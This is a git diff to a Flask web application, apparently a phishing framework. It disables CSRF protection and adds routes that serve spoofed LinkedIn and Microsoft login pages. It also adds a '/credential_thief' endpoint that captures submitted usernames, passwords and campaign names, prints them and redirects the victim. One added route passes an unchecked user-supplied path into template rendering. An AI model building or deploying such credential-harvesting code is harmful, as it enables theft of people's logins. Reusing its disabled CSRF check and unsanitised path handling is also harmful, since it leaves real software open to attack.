@@ -63,7 +63,7 @@ csrf = CSRFProtect()
 
 routes = Blueprint('routes', __name__)
 app = Flask(__name__)
-csrf.init_app(app)
+#csrf.init_app(app) #TODO: find a way to disable this for the spoof_pages
 
 app.config['RECAPTCHA_PUBLIC_KEY'] = parser.get('recaptcha', 'site_key')
 app.config['RECAPTCHA_PRIVATE_KEY'] = parser.get('recaptcha', 'secret_key')
@@ -188,6 +188,36 @@ def handle_terminal():
 def error():
     pass
 
+#########[ DEBUG CRAP - REMOVE BEFORE PR ]##############
+@routes.route('/linkedin', methods=["GET", "POST"])
+def linkedin():
+    return render_template("spoofed_website_templates/linkedin/index.html")
+ 
+@routes.route('/microsoft', methods=["GET", "POST"])
+def microsoft():
+    return render_template("spoofed_website_templates/microsoft/index.html")
+
+@routes.route('/microsoft/<path:filename>', methods=["GET", "POST"])
+def microsoft_aux_files(filename):
+    return render_template("spoofed_website_templates/microsoft/" + filename)
+
+@routes.route("/credential_thief", methods=["GET", "POST"])
+def hijack_creds():
+    #dict = request.form
+    dict = {"username" : request.form['username'],
+            "password" : request.form['password'],
+            "redirect_url" : request.form['redirect_url'],
+            "campaign" : request.form['campaign']
+           }
+
+    print "-" * 80
+    for key in dict:
+        print "\t" + key + ':' + dict[key]
+    print "-" * 80
+
+    return redirect(url_for("routes." + dict["redirect_url"]))
+
+###############[ END DEBUG ]############################
 app.register_blueprint(routes)
 
 if __name__ == '__main__':
@@ -196,4 +226,4 @@ if __name__ == '__main__':
     '''
     initialise_users_for_routes()
     app.secret_key = os.urandom(24)
-    app.run(host='0.0.0.0',port=8081)
+    app.run(host='0.0.0.0',port=8080)
